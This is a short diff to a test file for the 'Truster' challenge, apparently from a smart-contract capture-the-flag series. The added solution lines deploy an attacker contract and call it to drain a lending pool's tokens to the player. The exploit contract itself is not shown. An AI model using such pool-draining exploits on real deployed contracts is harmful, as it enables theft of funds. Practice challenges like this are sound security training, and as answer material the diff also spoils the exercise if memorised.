@@ -23,6 +23,8 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attacker = await (await ethers.getContractFactory('TakeAllTruster', player)).deploy(token.address);
+        await attacker.connect(player).takeAll(pool.address,player.address);
     });
 
     after(async function () {
